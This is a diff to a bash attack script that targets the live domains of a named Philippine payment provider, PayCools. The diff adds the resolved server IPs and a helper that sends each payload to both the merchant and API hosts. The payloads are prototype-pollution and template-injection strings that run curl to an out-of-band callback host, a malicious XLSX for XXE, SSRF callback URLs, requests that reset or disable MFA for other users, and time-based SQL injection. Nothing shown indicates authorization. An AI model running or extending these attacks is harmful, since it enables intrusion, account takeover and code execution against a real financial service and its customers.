@@ -10,7 +10,12 @@
 #   4. MFA bypass via /auth/resetMFA IDOR
 
 # ── CONFIGURE THESE ──
-MERCHANT="https://merchant.paycools.com"
+# Confirmed live domains (.com.ph not .com):
+#   merchant.paycools.com.ph  -> 47.90.115.109 (Alibaba Cloud) HTTP 200
+#   api.paycools.com.ph       -> 8.212.181.203 (Alibaba Cloud) nginx
+#   cashier.paycools.com.ph   -> found in JS
+MERCHANT="https://merchant.paycools.com.ph"
+API="https://api.paycools.com.ph"
 CASHIER="https://cashier.paycools.com.ph"
 OOB="testrce.6u.gg"
 TOKEN="YOUR_JWT_HERE"
@@ -18,6 +23,9 @@ MERCHANT_ID="YOUR_MERCHANT_ID"
 
 H1="Authorization: Bearer $TOKEN"
 H2="Content-Type: application/json"
+
+# Sentry release: 8fbff5b021a6ed46744d029cffbe1eda8bacb8b8
+# Build version: V_2026_09_10_22_05_17
 
 echo "=== PayCools OOB Tests (Real Endpoints) ==="
 echo "Monitor $OOB for callbacks"
@@ -34,6 +42,21 @@ PP1='{"__proto__":{"sourceURL":"\nreturn require(\"child_process\").exec(\"curl 
 PP2='{"constructor":{"prototype":{"sourceURL":"\nreturn require(\"child_process\").exec(\"curl http://'"$OOB"'/pc-proto-2\")//"}}}'
 PP3='{"__proto__":{"sourceURL":"\n};return require(\"child_process\").execSync(\"curl http://'"$OOB"'/pc-proto-3\");//"}}'
 
+# Helper: try both merchant and API domains
+try_both() {
+  local method="$1" ep="$2" payload="$3" label="$4"
+  echo "[$label] $method merchant$ep"
+  curl -sk "$MERCHANT$ep" \
+    -X "$method" -H "$H1" -H "$H2" \
+    -d "$payload" \
+    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+  echo "[$label] $method api$ep"
+  curl -sk "$API$ep" \
+    -X "$method" -H "$H1" -H "$H2" \
+    -d "$payload" \
+    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+}
+
 # Real endpoints from JS extraction
 REAL_ENDPOINTS=(
   "/auth/login"
@@ -45,19 +68,15 @@ REAL_ENDPOINTS=(
   "/auth/forget/resetPwd"
   "/auth/getPicVerificationCode"
   "/merchant/async/download/task/list"
+  "/detail/payin/linkTrans"
 )
 
 for ep in "${REAL_ENDPOINTS[@]}"; do
-  echo "[PP] POST $MERCHANT$ep"
-  curl -sk "$MERCHANT$ep" \
-    -X POST -H "$H1" -H "$H2" \
-    -d "$PP1" \
-    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+  try_both POST "$ep" "$PP1" "PP1"
 done
 
 echo ""
-echo "[PP] Testing Vue route-based API paths..."
-# Vue routes suggest these API patterns exist
+echo "[PP] Testing Vue route-derived API paths..."
 GUESSED_API=(
   "/api/financialManage"
   "/api/transition"
@@ -72,30 +91,22 @@ GUESSED_API=(
   "/api/qrStand"
   "/api/platform"
   "/api/questionnaire"
-  "/detail/payin/linkTrans"
 )
 
 for ep in "${GUESSED_API[@]}"; do
-  echo "[PP] POST $MERCHANT$ep"
-  curl -sk "$MERCHANT$ep" \
-    -X POST -H "$H1" -H "$H2" \
-    -d "$PP1" \
-    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
-
-  curl -sk "$MERCHANT$ep" \
-    -X PUT -H "$H1" -H "$H2" \
-    -d "$PP2" \
-    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+  try_both POST "$ep" "$PP1" "PP1"
+  try_both PUT "$ep" "$PP2" "PP2"
 done
 
-# Also try cashier subdomain
+# Cashier subdomain
 echo ""
 echo "[PP] Testing cashier.paycools.com.ph..."
 for ep in "/api/payment" "/api/checkout" "/api/transaction" "/api/order"; do
+  echo "[PP-cashier] POST $ep"
   curl -sk "$CASHIER$ep" \
     -X POST -H "$H2" \
     -d "$PP1" \
-    -o /dev/null -w "  [cashier] POST $ep -> HTTP %{http_code}\n" --max-time 10 2>/dev/null
+    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
 done
 
 # ─────────────────────────────────────────────────────────────
@@ -175,18 +186,22 @@ cd "$TMPDIR" && zip -r "$XLSX_FILE" . -x "*.DS_Store" 2>/dev/null && cd - >/dev/
 
 echo "[XXE] Uploading malicious XLSX to various upload endpoints..."
 
-# Try common upload endpoints
-UPLOAD_ENDPOINTS=(
-  "$MERCHANT/merchant/async/download/task/list"
-  "$MERCHANT/api/import"
-  "$MERCHANT/api/upload"
-  "$MERCHANT/api/merchant/import"
-  "$MERCHANT/api/financialManage/import"
-  "$MERCHANT/api/transition/import"
-  "$MERCHANT/api/transition/upload"
-  "$MERCHANT/api/onlinePayment/import"
-  "$MERCHANT/api/systemManage/import"
+# Try upload endpoints on both domains
+UPLOAD_PATHS=(
+  "/merchant/async/download/task/list"
+  "/api/import"
+  "/api/upload"
+  "/api/merchant/import"
+  "/api/financialManage/import"
+  "/api/transition/import"
+  "/api/transition/upload"
+  "/api/onlinePayment/import"
+  "/api/systemManage/import"
 )
+UPLOAD_ENDPOINTS=()
+for up in "${UPLOAD_PATHS[@]}"; do
+  UPLOAD_ENDPOINTS+=("$MERCHANT$up" "$API$up")
+done
 
 for ep in "${UPLOAD_ENDPOINTS[@]}"; do
   echo "  [XXE] POST $ep"
@@ -209,49 +224,25 @@ echo ""
 echo "--- [3] SSRF via Office Viewer + Other Vectors ---"
 
 echo "[SSRF] Testing document preview/download endpoints..."
-curl -sk "$MERCHANT/api/merchant/async/download/task/list" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"fileUrl\": \"http://$OOB/pc-ssrf-fileurl\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+try_both POST "/merchant/async/download/task/list" "{\"fileUrl\":\"http://$OOB/pc-ssrf-fileurl\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
+try_both POST "/api/financialManage/export" "{\"callbackUrl\":\"http://$OOB/pc-ssrf-fin-export\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
 
-curl -sk "$MERCHANT/api/financialManage/export" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"callbackUrl\": \"http://$OOB/pc-ssrf-fin-export\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
-
-# Payment link creation — might accept redirect URLs
 echo "[SSRF] Payment link creation..."
-curl -sk "$MERCHANT/api/paymentLink" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"redirectUrl\": \"http://$OOB/pc-ssrf-paylink-redir\", \"callbackUrl\": \"http://$OOB/pc-ssrf-paylink-cb\", \"amount\": 1, \"currency\": \"PHP\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+try_both POST "/api/paymentLink" "{\"redirectUrl\":\"http://$OOB/pc-ssrf-paylink-redir\",\"callbackUrl\":\"http://$OOB/pc-ssrf-paylink-cb\",\"amount\":1,\"currency\":\"PHP\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
 
-# Online payment — webhook/notification URLs
 echo "[SSRF] Online payment webhook..."
-curl -sk "$MERCHANT/api/onlinePayment" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"notifyUrl\": \"http://$OOB/pc-ssrf-notify\", \"returnUrl\": \"http://$OOB/pc-ssrf-return\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+try_both POST "/api/onlinePayment" "{\"notifyUrl\":\"http://$OOB/pc-ssrf-notify\",\"returnUrl\":\"http://$OOB/pc-ssrf-return\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
 
-# Payout — callback
 echo "[SSRF] Payout callback..."
-curl -sk "$MERCHANT/api/onlinePayout" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"callbackUrl\": \"http://$OOB/pc-ssrf-payout\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+try_both POST "/api/onlinePayout" "{\"callbackUrl\":\"http://$OOB/pc-ssrf-payout\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
 
-# QR Stand — might accept image/logo URLs
 echo "[SSRF] QR Stand config..."
-curl -sk "$MERCHANT/api/qrStand" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"logoUrl\": \"http://$OOB/pc-ssrf-qr-logo\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+try_both POST "/api/qrStand" "{\"logoUrl\":\"http://$OOB/pc-ssrf-qr-logo\",\"merchantId\":\"$MERCHANT_ID\"}" "SSRF"
 
-# Cashier subdomain
 echo "[SSRF] Cashier subdomain..."
 curl -sk "$CASHIER/api/payment/create" \
   -X POST -H "$H2" \
-  -d "{\"notifyUrl\": \"http://$OOB/pc-ssrf-cashier\", \"returnUrl\": \"http://$OOB/pc-ssrf-cashier-ret\", \"amount\": \"1\", \"currency\": \"PHP\"}" \
+  -d "{\"notifyUrl\":\"http://$OOB/pc-ssrf-cashier\",\"returnUrl\":\"http://$OOB/pc-ssrf-cashier-ret\",\"amount\":\"1\",\"currency\":\"PHP\"}" \
   -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
 
 # ─────────────────────────────────────────────────────────────
@@ -264,22 +255,31 @@ echo ""
 echo "--- [4] MFA IDOR Tests ---"
 
 echo "[MFA] Reset MFA for another user..."
-curl -sk "$MERCHANT/auth/resetMFA" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"userId\": \"1\", \"merchantId\": \"$MERCHANT_ID\"}" \
-  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  echo "  -> $BASE/auth/resetMFA"
+  curl -sk "$BASE/auth/resetMFA" \
+    -X POST -H "$H1" -H "$H2" \
+    -d "{\"userId\": \"1\", \"merchantId\": \"$MERCHANT_ID\"}" \
+    -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+done
 
 echo "[MFA] Change MFA status for another user..."
-curl -sk "$MERCHANT/auth/changeMfaStatus" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"userId\": \"1\", \"status\": false, \"merchantId\": \"$MERCHANT_ID\"}" \
-  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  echo "  -> $BASE/auth/changeMfaStatus"
+  curl -sk "$BASE/auth/changeMfaStatus" \
+    -X POST -H "$H1" -H "$H2" \
+    -d "{\"userId\": \"1\", \"status\": false, \"merchantId\": \"$MERCHANT_ID\"}" \
+    -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+done
 
 echo "[MFA] Device auth bypass..."
-curl -sk "$MERCHANT/auth/deviceAuthCodeSuccess" \
-  -X POST -H "$H1" -H "$H2" \
-  -d "{\"code\": \"000000\", \"userId\": \"1\"}" \
-  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  echo "  -> $BASE/auth/deviceAuthCodeSuccess"
+  curl -sk "$BASE/auth/deviceAuthCodeSuccess" \
+    -X POST -H "$H1" -H "$H2" \
+    -d "{\"code\": \"000000\", \"userId\": \"1\"}" \
+    -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+done
 
 # ─────────────────────────────────────────────────────────────
 # TEST 5: Direct SSTI in string fields
@@ -292,11 +292,13 @@ SSTI='${require("child_process").exec("curl http://'"$OOB"'/pc-ssti-interp")}'
 SSTI2='<%= global.process.mainModule.require("child_process").execSync("curl http://'"$OOB"'/pc-ssti-eval") %>'
 
 for ep in "/auth/login" "/auth/forget/sendResetPwdEmail" "/api/paymentLink" "/detail/payin/linkTrans"; do
-  echo "[SSTI] POST $MERCHANT$ep"
-  curl -sk "$MERCHANT$ep" \
-    -X POST -H "$H2" \
-    -d "{\"email\": \"$SSTI\", \"username\": \"$SSTI\", \"password\": \"test\"}" \
-    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+  for BASE in "$MERCHANT" "$API"; do
+    echo "[SSTI] POST $BASE$ep"
+    curl -sk "$BASE$ep" \
+      -X POST -H "$H2" \
+      -d "{\"email\": \"$SSTI\", \"username\": \"$SSTI\", \"password\": \"test\"}" \
+      -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+  done
 done
 
 # ─────────────────────────────────────────────────────────────
@@ -308,32 +310,42 @@ echo "--- [6] SQLi Time-based Blind ---"
 
 # Login endpoint — email field
 echo "[SQLi] Login email field..."
-curl -sk "$MERCHANT/auth/login" \
-  -X POST -H "$H2" \
-  -d '{"email":"admin'\''  AND SLEEP(5)-- ","password":"test"}' \
-  -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  curl -sk "$BASE/auth/login" \
+    -X POST -H "$H2" \
+    -d '{"email":"admin'\''  AND SLEEP(5)-- ","password":"test"}' \
+    -o /dev/null -w "  $BASE -> HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+done
 
 # Forgot password — email field
 echo "[SQLi] Forgot password email..."
-curl -sk "$MERCHANT/auth/forget/sendResetPwdEmail" \
-  -X POST -H "$H2" \
-  -d '{"email":"test'\'' AND SLEEP(5)-- "}' \
-  -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  curl -sk "$BASE/auth/forget/sendResetPwdEmail" \
+    -X POST -H "$H2" \
+    -d '{"email":"test'\'' AND SLEEP(5)-- "}' \
+    -o /dev/null -w "  $BASE -> HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+done
 
 # Transaction search
 echo "[SQLi] Transaction search..."
-curl -sk "$MERCHANT/api/transition?search=test'%20AND%20SLEEP(5)--" \
-  -H "$H1" -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  curl -sk "$BASE/api/transition?search=test'%20AND%20SLEEP(5)--" \
+    -H "$H1" -o /dev/null -w "  $BASE -> HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+done
 
 # Financial management listing
 echo "[SQLi] Financial management..."
-curl -sk "$MERCHANT/api/financialManage?search=test'%20AND%20SLEEP(5)--" \
-  -H "$H1" -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  curl -sk "$BASE/api/financialManage?search=test'%20AND%20SLEEP(5)--" \
+    -H "$H1" -o /dev/null -w "  $BASE -> HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null
+done
 
 # Agent merchant listing
 echo "[SQLi] Agent merchant..."
-curl -sk "$MERCHANT/api/agentMerchant?search=1'%20UNION%20SELECT%20NULL,NULL,NULL--" \
-  -H "$H1" -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
+for BASE in "$MERCHANT" "$API"; do
+  curl -sk "$BASE/api/agentMerchant?search=1'%20UNION%20SELECT%20NULL,NULL,NULL--" \
+    -H "$H1" -o /dev/null -w "  $BASE -> HTTP %{http_code}\n" --max-time 10 2>/dev/null
+done
 
 echo ""
 echo "=== Done. Check $OOB dashboard ==="
